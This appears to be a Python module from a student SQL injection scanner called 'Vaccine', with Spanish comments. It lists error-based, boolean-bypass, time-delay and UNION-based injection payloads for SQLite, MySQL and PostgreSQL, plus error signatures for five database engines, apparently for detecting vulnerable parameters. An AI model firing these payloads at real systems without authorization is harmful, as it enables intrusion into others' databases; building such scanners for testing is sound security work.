# ==============================================================================
# DOCUMENTACIÓN DE PAYLOADS DE VACCINE (SQL INJECTION MUNICIÓN)
# ==============================================================================

# ------------------------------------------------------------------------------
# 1. Error-based (Ataque a la fuerza / Rompedor de Sintaxis)
# ------------------------------------------------------------------------------
ERROR_PAYLOADS = [
    "'", "\"", "\\", "';", "\";", "`)", "')", "\""
]

# ------------------------------------------------------------------------------
# 2. Boolean-based (Ceguera Lógica / Bypass)
# ------------------------------------------------------------------------------
BOOLEAN_PAYLOADS = [
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    " OR 1=1",
    "' OR 1=1--"
]

# ------------------------------------------------------------------------------
# 3. Time-based (Ataque Demorado / Inyección Asíncrona) (BONUS)
# ------------------------------------------------------------------------------
TIME_PAYLOADS = [
    # SQLite (randomblob gasta ciclos CPU simulando un delay)
    "' AND (SELECT randomblob(1000000000))--",
    # MySQL / MariaDB (función sleep nativa)
    "' OR SLEEP(3)--",
    # PostgreSQL (función pg_sleep nativa)
    "' OR pg_sleep(3)--"
]

# ------------------------------------------------------------------------------
# 4. Union-based Detect (Exfiltración Directa) (BONUS)
# ------------------------------------------------------------------------------
UNION_PAYLOADS = [
    "' UNION SELECT 'VACCINE_UNION_TEST', 'VACCINE_UNION_TEST'--",
    "' UNION SELECT 'VACCINE_UNION_TEST'--"
]

# ------------------------------------------------------------------------------
# 5. Firmas de errores de motores de bases de datos (CUMPLE PUNTO BONUS: + Motores DB)
# ------------------------------------------------------------------------------
DB_ERRORS = {
    "SQLite": [
        "sqlite3.OperationalError", "unrecognized token:", "SQL logic error", "no such column:"
    ],
    "MySQL": [
        "you have an error in your sql syntax", "warning: mysql", "mysql_fetch_array()", "mysql_query()"
    ],
    "PostgreSQL": [
        "syntax error at or near", "postgresql", "pg_query()", "valid postgresql result"
    ],
    "Oracle": [
        "ora-00933", "oracle error", "quoted string not properly terminated"
    ],
    "Microsoft SQL Server": [
        "unclosed quotation mark after the character string", "microsoft sql native client error", "sqlexception"
    ]
}
